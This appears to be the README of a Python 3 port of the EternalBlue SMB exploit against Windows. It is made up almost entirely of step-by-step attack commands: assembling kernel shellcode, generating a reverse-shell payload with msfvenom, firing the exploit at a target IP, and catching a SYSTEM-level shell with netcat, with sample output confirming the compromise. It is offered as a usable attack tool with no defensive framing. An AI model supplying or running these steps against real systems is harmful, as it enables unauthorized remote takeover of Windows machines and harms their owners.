# EternalBlue-in-Python3

## How to use

### 1. Clone the repository

```
git clone https://github.com/Gabriel-Lima232/EternalBlue-in-Python3.git
```

## 2. Compiling the shellcode(s)

### x64

```
nasm -f bin shellcode/eternalblue_x64.asm -o ./sc_x64_kernel.bin
```

### x86

```
nasm -f bin shellcode/eternalblue_x86.asm -o ./sc_x86_kernel.bin
```

## 3. Create a Bin

### x64

```
msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=127.0.0.1 --platform windows -a x64 --format raw -o sc_x64_payload.bin
```

### x86

```
msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=127.0.0.1 --platform windows -a x86 --format raw -o sc_x86_payload.bin
```

## 4. Exploit!

```
python3 eternal-blue.py TARGET-IP final.bin
```

### Open NC and wait the connection

```
$ nc -lvnp 443
listening on [any] 443 ...
connect to [0.0.0.0] from (UNKNOWN) [0.0.0.0] 49191
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

